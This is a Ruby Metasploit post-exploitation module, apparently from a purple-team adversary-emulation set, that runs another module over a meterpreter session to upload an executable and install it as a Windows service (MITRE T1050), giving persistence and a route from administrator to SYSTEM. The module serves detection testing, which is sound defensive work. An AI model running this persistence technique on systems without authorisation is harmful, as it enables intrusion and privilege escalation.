##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'New Service (T1050) Windows - Purple Team',
                      'Description'   => %q{
                        Persistence, Privilege Escalation:
                        When operating systems boot up, they can start programs or applications called services that perform background system functions. A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry.

                        Adversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with Masquerading. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1050' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, 'Module to execute', 'post/windows/purple/t1035']),
      OptString.new("SERVICE_NAME", [ true, 'Name of service', 't1050svc']),
      OptString.new("UPLOAD_PATH", [true, 'File upload path', 'C:\\t1050svc.exe']),
      OptString.new("SERVICE_EXE", [true, 'The executable options for the service', 'C:\\t1050svc.exe']),
      OptBool.new("CLEANUP", [true, 'Cleanup EXE and remove service', true])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['CLEANUP'] = datastore['CLEANUP']
      framework_mod.datastore['SERVICE_NAME'] = datastore['SERVICE_NAME']
      framework_mod.datastore['UPLOAD_PATH'] = datastore['UPLOAD_PATH']
      framework_mod.datastore['SERVICE_EXE'] = datastore['SERVICE_EXE']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'  => false)
  end

  def run
    return 0 if session.type != "meterpreter"

    mod = datastore['MODULE']
    begin
        print_status("Executing '#{mod}' on #{session.inspect}")
        run_module(mod)
        print_good("Module T1050W execution successful.")
    rescue ::Exception => e
        print_error("Module T1050W execution failed.")
        return
    end
   end
end
